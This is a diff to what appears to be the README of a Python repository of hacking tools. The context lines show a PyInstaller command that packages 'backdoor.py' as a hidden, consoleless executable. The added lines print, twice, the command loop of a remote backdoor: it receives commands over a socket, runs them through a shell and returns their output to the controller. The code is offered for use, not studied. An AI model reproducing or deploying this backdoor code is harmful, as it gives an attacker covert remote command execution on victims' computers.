@@ -9,3 +9,24 @@ Python Keylogger PortScanner BruteForce and basic hack tools.(new ones will come
 ```python
 pyinstaller backdoor.py --onefile --noconsole
 ```
+### Additional codes:
+#command = reliable_recv()
+#message = 'Hello world'
+#s.send(message.encode())
+
+#s.recv(1024)
+#execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+
+#result = execute.stdout.read() + execute.stderr.read()
+#reliable_send(result)
+```python
+command = reliable_recv()
+message = 'Hello world'
+s.send(message.encode())
+
+s.recv(1024)
+execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+
+result = execute.stdout.read() + execute.stderr.read()
+reliable_send(result)
+```
